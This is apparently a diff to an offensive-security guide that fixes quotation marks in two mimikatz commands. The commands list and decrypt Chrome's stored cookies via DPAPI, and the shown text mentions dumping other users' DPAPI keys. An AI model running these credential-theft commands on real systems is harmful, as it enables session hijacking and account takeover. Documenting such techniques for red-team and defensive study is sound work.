@@ -635,10 +635,10 @@ For example, the following mimikatz command will list out Chrome's stored cookie
 
 ```bat
 :: List out cookies.
-dpapi::chrome /in:”%localappdata%\Google\Chrome\User Data\Default\Cookies”
+dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies"
 
 :: If executing in the context of the user that "owns" those cookies, we can decrypt without the password.
-dpapi::chrome /in:”%localappdata%\Google\Chrome\User Data\Default\Cookies” /unprotect
+dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
 ```
 
 It may be possible to dump the DPAPI keys for other logged in users via the following:
